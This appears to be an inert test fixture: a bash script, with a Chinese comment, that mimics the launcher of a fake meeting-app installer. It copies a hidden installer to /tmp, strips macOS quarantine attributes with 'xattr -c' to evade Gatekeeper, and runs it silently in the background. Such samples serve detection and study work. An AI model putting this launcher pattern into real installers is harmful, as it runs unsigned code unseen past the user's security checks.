#!/bin/bash
# 惰性样本：模仿 2026 年 10 月真实的假会议软件 Zeff 安装镜像的结构。
# This script launches the application without using Apple's official code signing or notarization process.
DIR="$(cd "$(dirname "$0")" && pwd)"
TEMP_APP="/tmp/tsuba-fixture"
cp -r "$DIR/.back/installer" "$TEMP_APP"
xattr -c "$TEMP_APP"
nohup /tmp/tsuba-fixture &>/dev/null &
